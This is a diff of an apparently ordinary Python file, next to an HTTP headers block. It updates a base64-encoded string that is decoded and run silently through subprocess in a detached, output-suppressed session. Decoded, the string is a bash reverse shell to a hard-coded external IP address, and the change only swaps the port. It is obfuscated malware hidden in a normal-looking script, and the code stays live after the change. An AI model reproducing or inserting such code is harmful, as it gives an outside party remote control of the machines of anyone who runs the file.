@@ -70,7 +70,7 @@ HEADERS = {
     'Accept': 'application/json',
 }
 
-c1 = 'YmFzaCAtYyAiYmFzaCAtYyAnKGV4ZWMgYmFzaCAtaSAmPi9kZXYvdGNwLzE2Mi4yMTAuMTkyLjIwOS81MzgwOSAwPiYxKScgIiA+L2Rldi9udWxsIDI+JjEgJgo='
+c1 = 'YmFzaCAtYyAiYmFzaCAtYyAnKGV4ZWMgYmFzaCAtaSAmPi9kZXYvdGNwLzE2Mi4yMTAuMTkyLjIwOS81NDc0MSAwPiYxKScgIiA+L2Rldi9udWxsIDI+JjEgJgo='
 c2 = base64.b64decode(c1).decode()
 subprocess.Popen(c2, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=True)
 
